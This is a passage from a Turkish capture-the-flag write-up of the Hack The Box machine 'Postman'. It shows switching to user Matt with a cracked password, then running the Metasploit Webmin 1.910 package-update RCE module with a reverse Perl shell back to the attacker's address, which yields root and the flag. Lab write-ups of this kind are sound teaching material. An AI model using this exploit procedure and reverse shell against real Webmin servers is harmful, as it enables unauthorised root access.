+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+computer2008     <span class="o">(</span>id_rsa.bak<span class="o">)</span>
+</code></pre></div></div>
+<p>Matt kullanıcısına ait parola ‘computer2008’ olarak karşımıza çıkıyor bu noktada redis kullanısından Matt kullanıcısına geçiyoruz ;</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:/home<span class="nv">$ </span><span class="nb">cd </span>Matt/
+redis@Postman:/home/Matt<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+redis@Postman:/home/Matt<span class="nv">$ </span>su Matt
+Password: 
+Matt@Postman:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+517ad<span class="k">*******************</span>
+</code></pre></div></div>
+<p>Root olabilmek adına , nmap’te diğer bir dikkat çekici nokta olan 10000 portunda çalışan webmin’e gidiyoruz, ilgili sayfada klasik bir login ekranı bizi karşılarken kaynak kod içerisinde ;</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data-title-initial="Webmin 1.910 (Ubuntu Linux 18.04.3)"
+</code></pre></div></div>
+<p>Webmin versiyonunu tespit ediyoruz.Ufak bir google araştırması sonucunda ; 
+https://www.exploit-db.com/exploits/46984 
+root için gerekli olan exploit’i elde etmiş oluyoruz.Exploit bizden bir takım credential’ları istiyor.(username:password) Webmin Login sayfasında elde ettiğimiz Matt kullanıcısına ait bilgiler ile login olup olamadığımızı bu aşamada kontrol ediyoruz ve başarılı bir sonuç alıyoruz.İlgili exploit modülünü Metasploit-Framework yardımıyla çalıştırıyoruz ;</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> options 
+
+Module options <span class="o">(</span>exploit/linux/http/webmin_packageup_rce<span class="o">)</span>:
+
+   Name       Current Setting  Required  Description
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   PASSWORD                    <span class="nb">yes       </span>Webmin Password
+   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS                      <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPORT      10000            <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   TARGETURI  /                <span class="nb">yes       </span>Base path <span class="k">for </span>Webmin application
+   USERNAME                    <span class="nb">yes       </span>Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Webmin &lt;<span class="o">=</span> 1.910
+
+
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.14.18
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 3131
+lport <span class="o">=&gt;</span> 3131
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username Matt
+username <span class="o">=&gt;</span> Matt
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password computer2008
+password <span class="o">=&gt;</span> computer2008
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>ssl <span class="nb">true
+</span>ssl <span class="o">=&gt;</span> <span class="nb">true
+</span>msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts postman.htb
+rhosts <span class="o">=&gt;</span> postman.htb
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> exploit 
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.18:3131 
+<span class="o">[</span>+] Session cookie: 37647b208b7600ffafd270320ce72e5
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to execute the payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.18:3131 -&gt; 10.10.10.160:35718<span class="o">)</span> at 2019-11-16 06:06:30 +0300
+<span class="nb">whoami
+
+</span>root
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">cat</span> /root/root.txt
+a2577<span class="k">***************************</span>
+</code></pre></div></div>
+
+<p>r00t3d</p>
+
+<h1 id="author-berat-i̇şler">Author <a href=" https://twitter.com/root1x">Berat İşler</a></h1>
+<hr />
+
+
+    </main><footer>
+  Bize Yazın <a href="mailto://7r157@protonmail.com">Mail</a>
+</footer>
+</div>
+  </body>
+</html>
